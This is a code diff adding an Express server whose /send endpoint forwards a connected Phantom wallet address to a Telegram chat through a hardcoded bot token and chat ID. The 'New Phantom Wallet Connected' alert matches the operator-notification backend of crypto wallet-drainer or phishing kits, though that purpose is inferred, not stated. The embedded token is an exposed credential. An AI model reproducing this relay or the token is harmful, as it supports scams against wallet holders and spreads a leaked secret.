@@ -1,0 +1,29 @@
+const express = require("express");
+const fetch = require("node-fetch");
+
+const app = express();
+app.use(express.json());
+
+const BOT_TOKEN = "8312052043:AAEQu6w364jNgh8-mb7PVaJEJSawjdfdbWw";
+const CHAT_ID = "8499454202";
+
+app.post("/send", async (req, res) => {
+  const { address } = req.body;
+
+  try {
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: `🔔 New Phantom Wallet Connected\n${address}`
+      })
+    });
+
+    res.json({ success: true });
+  } catch (e) {
+    res.status(500).json({ error: "failed" });
+  }
+});
+
+app.listen(3000);
